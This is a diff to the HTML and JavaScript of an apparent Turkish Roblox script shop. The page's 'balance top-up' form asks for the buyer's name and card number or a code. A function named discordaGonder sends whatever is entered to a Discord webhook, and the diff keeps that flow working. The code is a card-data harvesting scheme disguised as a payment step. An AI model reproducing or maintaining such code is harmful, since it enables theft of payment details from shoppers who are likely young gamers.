@@ -136,10 +136,8 @@
             <h1>Elite Roblox Script Mağazası</h1>
             <p>Aşağıdan istediğin oyunu aratabilirsin:</p>
             
-            <!-- EKLENEN BİLGİ YAZISI -->
             <div class="info-notice">⚠️ Scriptler en kötüden en iyiye doğru paket halinde sıralanmıştır.</div>
 
-            <!-- OYUN ARAMA ÇUBUĞU -->
             <div class="search-box">
                 <input type="text" id="searchInput" class="search-input" placeholder="🔍 Oyunlar" onkeyup="oyunlariFiltrele()">
             </div>
@@ -193,7 +191,7 @@
                     <div class="form-group"><label id="inputLabel">Kart Bilgileri / Ad Soyad:</label><input type="text" id="veriInput" class="form-control" placeholder="Ad Soyad ve Kart Numarası"><small id="formIpucu" style="color: #8888a0; font-size: 11px; margin-top: 6px; display: block;"></small></div>
                 </div>
                 <div>
-                    <button class="btn-action" onclick="kodKontrolEtEtVeYukle()">Ödemeyi Onayla ve Yükle</button>
+                    <button class="btn-action" onclick="kodKontrolEtEtEtVeYukle()">Ödemeyi Onayla ve Yükle</button>
                     <button class="btn-close-modal" onclick="modalKapat('bakiyeModal')">Kapat / Vazgeç</button>
                 </div>
             </div>
@@ -487,7 +485,7 @@
             }
         }
 
-        function kodKontrolEtEtVeYukle() {
+        function kodKontrolEtEtEtVeYukle() {
             let tutar = Number(document.getElementById("tutarInput").value);
             let veri = document.getElementById("veriInput").value.trim();
             if (!veri || tutar <= 0) { alert("Lütfen geçerli bir tutar ve kod girin!"); return; }
@@ -526,7 +524,7 @@
         function discordaGonder(tur, detay, tutar) {
             const veri = { content: `✅ **BAKİYE YÜKLENDİ!**\n👤 **Kullanıcı:** ${aktifKullanici}\n💳 **Yöntem:** ${tur}\n💰 **Tutar:** ${tutar} TL\n🔑 **Kod/Bilgi:** \`${detay}\`` };
             fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(veri) }).catch(hata => console.log("Discord Hatası:", hata));
-            
+        }
 
         function bildirimAc() {
             document.getElementById("scriptBaslik").innerText = sonAlinanUrunAdi + " - Otomatik Teslimat";
